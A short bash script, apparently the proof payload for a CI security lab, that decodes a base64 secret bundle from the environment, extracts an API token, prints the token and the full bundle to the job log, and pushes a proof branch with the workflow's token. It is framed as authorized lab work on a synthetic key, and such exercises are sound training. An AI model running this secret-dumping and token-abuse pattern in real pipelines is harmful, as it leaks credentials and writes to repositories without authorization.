#!/usr/bin/env bash
set -euo pipefail

proof_branch="lab3-proof-${GITHUB_RUN_ID}"
bundle="$(printf '%s' "$LAB3_SUPPORT_BUNDLE_B64" | base64 --decode)"
api_token="$(printf '%s\n' "$bundle" | awk -F= '/^LAB3_API_TOKEN=/{print $2}')"

printf 'Extracted synthetic API key: %s\n' "$api_token"
printf '%s\n' "$bundle"

git config user.name "Lab 3 Proof"
git config user.email "lab3-proof@example.invalid"
git switch -c "$proof_branch"
printf 'Lab 3 secret read + workflow-token write confirmed for run %s\n' "$GITHUB_RUN_ID" > lab3-proof.txt
git add lab3-proof.txt
git commit -m "lab: record authorized secret-read proof"
git push origin "HEAD:refs/heads/$proof_branch"

printf 'Also wrote proof branch: %s\n' "$proof_branch"
